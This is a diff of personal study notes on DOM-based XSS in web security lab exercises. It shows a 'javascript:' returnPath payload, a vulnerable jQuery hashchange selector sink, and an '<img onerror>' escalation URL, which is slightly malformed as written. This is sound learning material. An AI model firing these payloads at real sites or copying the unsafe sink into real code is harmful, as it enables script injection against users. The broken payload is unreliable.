@@ -450,8 +450,28 @@ You can also do dom based XSS
 -------------------------------
 
 https://0a67001b03d231a780716cda00a80042.web-security-academy.net/feedback?returnPath=javascript:alert(1);
+_______________________________________________________________________________________________________________________________________________________________________________________________
+jQuery selector sink using a hashchange event ( $ is the sign of using JQuery)
+----------------------------------------------
+
+<script>   
+	$(window).on('hashchange', function(){
+        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+        if (post) post.get(0).scrollIntoView();
+        });
+
+</script>
 
 
+https://0af300d3047fb3828091309400680083.web-security-academy.net/#Procastination
+
+if the text after the # is changed, the function works below. > if the text after # is h2 element > the website will shows that text (if (post) post.get(0).scrollIntoView();)> also if it is encoded > 
+it will become decoded text > the text will be started not including the # (window.location.hash.slice(1))
+
+So, finally we can escalate like that
+
+https://0af300d3047fb3828091309400680083.web-security-academy.net/#<img src=1 onerror(alert('xxx')>
+_______________________________________________________________________________________________________________________________________________________________________________________________
 
 
 
